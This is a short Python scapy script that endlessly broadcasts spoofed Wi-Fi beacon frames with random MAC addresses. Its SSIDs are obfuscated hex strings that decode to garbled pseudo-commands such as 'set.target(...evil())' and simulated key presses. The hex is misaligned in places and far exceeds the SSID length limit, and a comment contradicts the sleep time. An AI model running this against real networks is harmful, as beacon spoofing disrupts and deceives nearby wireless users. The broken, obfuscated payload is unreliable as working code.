import time
from scapy.all import *

def beacon(ssid):
    # Create a basic beacon frame with the specified SSID
    beacon_frame = RadioTap() / Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=RandMAC(), addr3=RandMAC()) / Dot11Beacon(cap='ESS') / Dot11Elt(ID='SSID', info=ssid, len=len(ssid))

    # Send the beacon frame
    sendp(beacon_frame, iface='Wi-Fi', loop=0, verbose=False)

def main():
    # Array of SSIDs
    ssids = ["7365742e7461726765742873747265657473637261706a756b69652e6576696c2829293ba6c6f636b2e74617267657428293ba656e746572206f6b7a796f6b20656e746572a6163636570746269742e6f6b28293ba696e7075746b65792e7072657373656428226374726c2b656e74657222293ba696e7075746b65792e70726573736564282273686966742b656e74657222293ba696e7075746b65792e707265737365642822656e74657222293ba", "7365742e7461726765742873747265657473637261706a756b69652e6576696c2829293ba6c6f636b2e74617267657428293ba656e746572206f6b7a796f6b20656e746572a6163636570746269742e6f6b28293ba696e7075746b65792e7072657373656428226374726c2b656e74657222293ba696e7075746b65792e70726573736564282273686966742b656e74657222293ba696e7075746b65792e707265737365642822656e74657222293ba"]  # Add more SSIDs if needed

    # Loop through each SSID indefinitely
    while True:
        for ssid in ssids:
            print(f"Broadcasting beacon for SSID: {ssid}")
            beacon(ssid)
            time.sleep(3)  # Broadcast beacon for 5 seconds

if __name__ == "__main__":
    main()
